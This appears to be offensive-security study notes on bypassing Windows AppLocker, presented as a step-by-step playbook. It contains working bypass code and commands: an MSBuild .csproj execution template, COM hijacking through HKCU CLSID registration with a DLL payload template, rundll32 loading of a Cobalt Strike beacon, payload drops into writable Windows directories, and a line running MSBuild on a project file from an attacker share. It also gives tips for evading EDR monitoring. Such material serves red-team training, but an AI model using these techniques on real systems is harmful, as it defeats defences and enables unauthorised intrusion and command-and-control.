# C21 - AppLocker

## Overview

AppLocker enforces application control via **Allow/Deny rules** scoped to user/group with three condition types:
- **Publisher** — signed binary's certificate chain
- **Path** — file or folder path (supports wildcards)
- **File Hash** — SHA256 of the file

**Default rules allow execution from `%PROGRAMFILES%\*` and `%WINDIR%\*` for Everyone.**
Admins (`BUILTIN\Administrators`) always get a wildcard allow.

---

## Policy Enumeration

### From Registry (already on target machine)

```powershell
# Raw registry keys
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

# Parsed — readable rule output
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
```

Registry path: `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
Each subkey = rule type (Exe, Script, Msi, Appx, Dll)

### From GPO (Beacon on unprotected machine, targeting protected machine)

```cs
// Step 1 — find the AppLocker GPO by name
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

// Step 2 — list the GPO machine policy folder
beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{GPO-GUID}\Machine

// Step 3 — parse Registry.pol (sync to attacker desktop first)
```

```powershell
# On attacker Windows box (requires GpRegistryPolicy module)
Parse-PolFile -Path .\Desktop\Registry.pol
```

### Check PowerShell Language Mode (quick AppLocker indicator)

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage  = no AppLocker / not enforcing PS scripts
# ConstrainedLanguage = AppLocker is active
```

---

## Bypass Decision Tree

```
1. Enumerate policy → look for:
   a. Path wildcard misconfigurations  →  write to allowed dir and execute
   b. Writable dirs under %WINDIR%\*  →  drop payload there and run
   c. DLL rules disabled              →  rundll32 bypass
   d. CLM but not Full Lockdown       →  COM object / WScript.Shell technique
   e. LOLBAS in allowed paths         →  MSBuild .csproj execution
```

---

## Bypass 1 — Path Wildcard Misconfiguration

Look for custom rules where the path anchor is missing (no `%PROGRAMFILES%` or `%WINDIR%` prefix):

```xml
<!-- Vulnerable rule example — ANY folder named App-V is allowed -->
<FilePathCondition Path="*\App-V\*"/>
```

**Exploit:** Create `C:\Users\<user>\App-V\` and drop payload there — it matches the wildcard.

---

## Bypass 2 — Writable Directories Under `%WINDIR%\*`

Standard users can write to these paths, which are inside the default allowed zone:

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\Tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

**Exploit:** Drop executable/script/installer into one of these → run directly.

```powershell
# Find additional writable dirs under Windows
Get-Acl C:\Windows\* | Where-Object { $_.Access | Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write" } }
icacls C:\Windows\Tasks
```

---

## Bypass 3 — LOLBAS (MSBuild)

`MSBuild.exe` lives in `%WINDIR%\Microsoft.NET\Framework\v4.0.30319\` — always allowed. Executes arbitrary C# from a `.csproj` file.

**Step 1 — Create `bypass.csproj`:**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
      <Reference Include="System.Windows.Forms" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using Microsoft.Build.Utilities;
        using System.Windows.Forms;

        public class MSBuild : Task
        {
            public override bool Execute()
            {
                // Replace MessageBox with shellcode exec / beacon staging
                MessageBox.Show("Hello World", "AppLocker Bypass");
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Step 2 — Execute:**

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
```

> **OPSEC-CAUTION:** MSBuild spawning child processes is signatured by modern EDR. Inline shellcode execution within the Task is stealthier than launching new processes.

---

## Bypass 4 — PowerShell CLM via Custom COM Object

AppLocker forces PowerShell into `ConstrainedLanguage` mode — no arbitrary .NET API calls. However, `New-Object -ComObject` still works.

**Technique:** Register a fake COM CLSID in HKCU pointing to your DLL → load it via `New-Object`.

**Step 1 — Generate a GUID:**

```powershell
[System.Guid]::NewGuid()
# Example output: 6136e053-47cb-4fdd-84b1-381bc5f3edb3
```

**Step 2 — Register the COM object (HKCU — no admin needed):**

```powershell
$guid = '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
$dllPath = 'C:\Windows\Tasks\bypass.dll'   # writable path under %WINDIR%

New-Item -Path "HKCU:Software\Classes\CLSID" -Name $guid
New-Item -Path "HKCU:Software\Classes\CLSID\$guid" -Name 'InprocServer32' -Value $dllPath
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\$guid\InprocServer32" -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value $guid
```

**Step 3 — Trigger DLL load:**

```powershell
New-Object -ComObject AppLocker.Bypass
```

**DLL template (DllMain executes on load):**

```c
#include <windows.h>

extern "C" __declspec(dllexport) BOOL execute() {
    // Beacon staging / shellcode exec here
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
        return execute();
    return TRUE;
}
```

> **OPSEC-SAFE:** Runs inside the PowerShell process — no child process spawned. HKCU registry write only (no admin). DLL must be in an AppLocker-allowed path (use writable %WINDIR% subdir).

---

## Bypass 5 — rundll32 (DLL Rules Disabled)

DLL enforcement rules are **off by default** due to performance impact. When disabled, `rundll32` can load any DLL regardless of AppLocker.

`rundll32.exe` lives in `%WINDIR%\System32\` — always allowed.

**Cobalt Strike Beacon DLL payload exports `StartW`:**

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

> **OPSEC-CAUTION:** `rundll32` is heavily monitored by EDR. Ensure `spawnto` and malleable profile are set. Consider hollowing rundll32 or using a stealthier loader.

Verify DLL rules are disabled first:

```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
# Empty output = DLL rules not configured = rundll32 bypass viable
```

---

## AppLocker Challenge — Methodology (No Instructions Provided)

Work through this checklist sequentially. Each step narrows the bypass path.

### Step 1 — Check if AppLocker is Active

```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage confirms AppLocker enforcement
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

### Step 2 — Enumerate All Rules

```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Format-List *
# Look for: custom path rules with loose wildcards, missing rule types (DLL = off?)
```

### Step 3 — Check DLL Rule Enforcement

```powershell
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
# Empty → rundll32 bypass available → go to Bypass 5
```

### Step 4 — Check for Writable Paths Under Allowed Dirs

```cmd
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
icacls C:\Windows\Tracing
```

If writable → drop payload (exe, script, DLL) → execute directly.

### Step 5 — Check for Path Wildcard Misconfigs

```powershell
$policy.RuleCollections | ForEach-Object { $_.Rules } | Where-Object { $_ -is [Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePathRule] } | Select-Object Name, Conditions
# Look for rules where path starts with * (not anchored to %WINDIR% or %PROGRAMFILES%)
```

Create a matching directory and execute from there.

### Step 6 — CLM Bypass via COM (if PS is constrained)

Use Bypass 4 above. Required: a DLL you can write to an allowed path.

### Step 7 — MSBuild LOLBAS

If you can write a `.csproj` file anywhere (doesn't need to be in an allowed path — MSBuild reads it as data, not executes it directly):

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\attacker\share\bypass.csproj
# Or write to C:\Windows\Tasks\bypass.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\bypass.csproj
```

### Step 8 — Cobalt Strike Beacon via Allowed Path

If you already have a Beacon and need to migrate/stage a new one on the AppLocker-protected host:

```cs
// Option A: rundll32 (DLL rules off)
beacon> shell rundll32.exe C:\Windows\Tasks\beacon.dll,StartW

// Option B: MSBuild .csproj with inline shellcode (in-memory exec via C# Task)
beacon> shell C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\stage.csproj

// Option C: execute-assembly from existing Beacon (bypasses AppLocker entirely — runs in Beacon memory)
beacon> execute-assembly C:\Tools\tool.exe
```

> `execute-assembly` loads .NET assemblies **into Beacon's memory** — AppLocker does not apply. Use this to run SharpHound, Rubeus, etc. on AppLocker-protected hosts.

---

## OPSEC Summary

| Technique | OPSEC | Notes |
|-----------|-------|-------|
| Writable %WINDIR% dir | CAUTION | Drops file to disk in monitored path |
| MSBuild .csproj | CAUTION | MSBuild spawning code is EDR-visible |
| rundll32 DLL load | CAUTION | rundll32 heavily scrutinised by EDR |
| COM CLM bypass | SAFE | In-process DLL load, HKCU only, no child proc |
| execute-assembly | SAFE | In-memory, bypasses AppLocker entirely |
| Path wildcard abuse | SAFE | No new files if payload already staged |

---

## Quick Reference

```
ENUMERATE:   Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
CLM CHECK:   $ExecutionContext.SessionState.LanguageMode
DLL RULES:   $policy.RuleCollections | ? { $_.RuleCollectionType -eq 'Dll' }
WRITABLE:    icacls C:\Windows\Tasks | C:\Windows\Temp | C:\Windows\Tracing
MSBUILD:     C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
RUNDLL32:    rundll32.exe C:\Windows\Tasks\beacon.dll,StartW   (DLL rules must be off)
COM BYPASS:  New-Object -ComObject AppLocker.Bypass             (after HKCU CLSID reg)
IN-MEMORY:   beacon> execute-assembly <tool.exe>               (bypasses AppLocker)
GPO ENUM:    ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
```
